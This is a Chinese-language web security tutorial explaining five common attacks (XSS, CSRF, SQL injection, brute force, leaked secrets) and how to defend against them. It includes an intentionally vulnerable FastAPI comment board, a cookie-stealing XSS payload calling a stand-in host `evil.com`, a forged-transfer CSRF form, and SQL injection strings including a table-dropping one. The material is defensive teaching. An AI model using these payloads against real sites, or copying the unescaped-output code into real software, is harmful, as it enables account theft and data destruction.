## 摘要
> 认证系统做得再好，一个 XSS 漏洞就能让所有防线形同虚设。这篇文章详解 Web 安全领域最常见的 5 类攻击——原理、危害、防御方案，以及可复现的漏洞代码。

## 引言

你花两周时间实现了双 Token 方案，JWT 密钥用 64 位随机字符串，密码用 argon2 存储，RBAC 权限控制滴水不漏。然后你上线了——三天后，用户数据全泄露。不是你的认证系统被攻破，而是你的评论区没做 XSS 防护，攻击者注入了一段 JS 代码，偷走了所有用户的 token。

Web 安全是一个"木桶效应"的典型案例——你的系统安全性不取决于最坚固的那块木板，而是取决于最薄弱的那一块。认证系统再强，如果页面有 XSS 漏洞、API 没做频率限制、密钥泄露到了 GitHub——那么所有的认证防线都形同虚设。

本文挑选了 Web 安全领域最常见的 5 类攻击，每一类都从攻击原理讲起，给出可复现的漏洞代码，然后是实际有效的防御方案。读完这篇文章，你应该能对自己的系统做一次基础的安全自查。

## 基础知识储备

1. **HTML/JavaScript 基础**：理解 `<script>` 标签的作用，知道浏览器会执行 HTML 中嵌入的 JS 代码。
2. **SQL 语法基础**：理解 `SELECT * FROM users WHERE username = ''` 的查询逻辑，知道单引号在 SQL 中的含义。
3. **HTTP Cookie 机制**：了解 Cookie 的几个安全属性（HttpOnly、Secure、SameSite）。
4. **环境变量和 .gitignore**：知道 `.env` 文件的作用和为什么不能提交到代码仓库。
5. **暴力破解概念**：理解攻击者用程序和字典反复尝试密码的过程。

## 正文

### 1. XSS（跨站脚本攻击）——攻击者在你页面里执行 JS

XSS 是攻击者将恶意 JavaScript 代码注入到你的网页中，当其他用户访问这个页面时，脚本在他们的浏览器中执行。根据注入方式不同，XSS 分为存储型（评论、留言）、反射型（URL 参数直接回显）、DOM 型（前端 JS 处理用户输入不当）。

核心危害：攻击者可以窃取 Cookie（如果没有 HttpOnly）、读取 localStorage 中的 token、模拟用户操作（转账、发帖、删除数据）、重定向到钓鱼页面。XSS 是所有认证系统的头号杀手——无论你的 JWT 方案多完善，只要攻击者能在你的域名下执行 JS，他就可以直接用当前登录用户的身份做任何事。

来看一段有漏洞的代码和修复后的对比：

```python
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

# 模拟留言板
comments = []

@app.get("/", response_class=HTMLResponse)
def index():
    html = "<h1>留言板</h1><ul>"
    for c in comments:
        # ❌ 危险：直接拼接用户输入，不转义
        html += f"<li>{c}</li>"
    html += "</ul>"
    return html

@app.post("/comment")
async def add_comment(request: Request):
    data = await request.json()
    comments.append(data["content"])  # 有人提交了 <script>alert('xss')</script>
    return {"ok": True}
```

攻击者提交留言内容为 `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`。这个脚本被存入 comments 列表，然后渲染到 HTML 中。任何访问留言板的用户，浏览器都会执行这段恶意 JS——攻击者的服务器收到了每个受害者的 Cookie。

三种防御手段缺一不可：输出时对所有用户输入做 HTML 实体转义（`<` 变成 `&lt;`）；Cookie 一律设置 `HttpOnly` 属性，让 JS 彻底无法读取；使用模板引擎的自动转义功能（Jinja2 的 `{{ }}` 默认转义）。

### 2. CSRF（跨站请求伪造）——借你的手干坏事

CSRF 不攻击你的网站，而是攻击你的用户。攻击流程是这样的：用户登录了 `bank.com`，Cookie 里存着有效的 session_id。用户同时又打开了攻击者发的钓鱼邮件，点了一个链接到 `evil.com`。`evil.com` 的页面中藏着一段代码：`<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"></form>`。这个表单自动提交——浏览器在发送请求时，自动带上了 `bank.com` 的 Cookie。银行服务器一看，Cookie 有效，以为是用户本人操作，转账成功。

核心原理：Cookie 是"跟域名走"的——浏览器看到请求的目标是 `bank.com`，就会自动把 `bank.com` 的 Cookie 附上，无论这个请求是从哪个网站发出的。

防御方案有三重：第一，Cookie 设置 `SameSite=Lax`（现代浏览器默认），禁止跨站请求携带 Cookie；第二，关键操作（转账、改密码、删数据）要求附带 CSRF Token——一个随机生成的隐藏表单字段，攻击者无法提前知晓；第三，验证请求的 `Referer` 或 `Origin` 头，确保请求来自你自己的网站。

### 3. SQL 注入——攻击者在搜索框里写 SQL

输入框里输入的不是搜索关键词，而是一段精心构造的 SQL 片段。经典注入：用户名填 `' OR '1'='1`，如果代码是字符串拼接——`f"SELECT * FROM users WHERE username='{input}' AND password='{hashed}'"`——拼接后的 SQL 变成 `SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'`。`OR '1'='1'` 永远为真，绕过密码验证。

更危险的注入可以删库：`'; DROP TABLE users; --`。或者通过 UNION SELECT 把整个数据库表的内容拖出来。SQL 注入在 2026 年的今天仍然稳居 OWASP Top 10 的前三名。

防御方案只有一条：永远不使用字符串拼接构造 SQL。使用 ORM（SQLAlchemy 的 `session.query(User).filter(User.email==email)`）或者参数化查询（`cursor.execute("SELECT * FROM users WHERE email=?", [email])`）。ORM 会自动转义所有参数，将用户输入当作"值"而非"SQL 关键字"处理。

### 4. 暴力破解——无限尝试直到命中

攻击者拿到一个用户邮箱（或手机号），用常见密码字典逐个尝试登录。如果系统没有任何限制，攻击者跑一夜字典，总能撞开一两个密码简单的账号。

登录频率限制是防御暴力破解的最基本手段。通常策略是：同一 IP 或同一账号，连续 5 次登录失败后锁定 15 分钟。注意这里的"锁定"不要做成永久封号——否则攻击者可以故意输错密码，把别人的账号锁死（这本身又是一种 DoS 攻击）。

除此之外，密码强度要求（最小长度、复杂度）、验证码（登录失败 N 次后出现）、多因素认证（短信/邮箱验证码），都是暴力破解的有效对抗手段。

### 5. 密钥泄露——把 `.env` 提交到 GitHub

这是最容易犯、后果最严重的安全事故。你把 AWS 密钥或 JWT Secret 写在了 `.env` 文件里，然后 `git add .`、`git commit`、`git push`。几小时后，攻击者的爬虫扫描 GitHub 发现了你的密钥，开始挖矿、发垃圾邮件、删除你的所有资源。

不止是 `.env` 文件——代码注释中的密码、默认配置中的测试密钥、调试输出中的 token……任何形式出现在代码仓库中的密钥都是定时炸弹。

防御：`.gitignore` 中添加 `.env` 和所有敏感配置文件；使用 `.env.example` 作为模板（只包含 key 名和占位符）；使用 Git 预提交钩子（如 `git-secrets` 或 `truffleHog`）扫描暂存区是否包含密钥模式；如果密钥已经泄露，第一时间在对应平台吊销密钥并生成新的，而不是只删除 Git 历史。

## 总结

1. XSS 是认证系统的头号杀手——通过注入 JS 窃取 token，所有认证防线形同虚设。防御靠输出转义 + HttpOnly Cookie。
2. CSRF 利用浏览器的自动 Cookie 机制，借用户之手执行恶意操作。SameSite Cookie + CSRF Token 双重防御。
3. SQL 注入仍是最常见的安全漏洞之一，防御方案很明确：永远用 ORM 或参数化查询，绝不拼接 SQL 字符串。
4. 暴力破解防御靠登录频率限制（5次失败锁15分钟）+ 密码强度要求 + 多因素认证。
5. 密钥泄露往往是最严重的——`.env` 上 GitHub 意味着所有安全基础设施沦陷。`.gitignore` + 预提交扫描是底线。

## 注意事项

1. 安全防护不是一劳永逸的——新的攻击手法不断出现，定期关注 OWASP Top 10 的变化（每 3-4 年更新一次）。
2. 输出转义和输入校验是两回事——输入校验（限制长度、格式）可以提高门槛，输出转义是兜底防线，两者都需要。
3. 不要自己实现加密或转义函数，使用经过安全审计的标准库和框架功能。

## 坑点

| 坑 | 现象 | 原因 | 解决方案 |
|----|------|------|----------|
| 只做了输入校验，没做输出转义 | 攻击者绕过前端校验（用 curl 直接 POST），恶意代码存入数据库后展示给所有用户 | 输入校验可以被绕过（直接调 API），输出转义是服务端的最后防线 | 前端校验做用户体验，后端输出转义做安全保障——两者分工明确 |
| Cookie 没设 HttpOnly | XSS 攻击中，攻击者的 JS 成功读取 `document.cookie` 拿到 session_id | Cookie 默认允许 JS 访问，HttpOnly 是可选属性 | 所有认证相关的 Cookie 必须设置 `httponly=True` |
| 登录限制用账号维度但忘记 IP 维度 | 攻击者用 1000 个不同账号尝试同一个弱密码（反向撞库），全绕过限制 | 频率限制只用单一维度（按账号或按 IP） | 同时监控"同一 IP 的登录尝试次数"和"同一账号的登录失败次数" |
| 代码注释里写了密钥 | 清除 `.env` 后仍然泄露，因为密钥被写在了代码注释 | 开发时为了方便把密钥写到注释里测试，忘记删除 | 搜索代码库中是否有密码/密钥模式的正则表达式，彻底清理后重新生成密钥 |
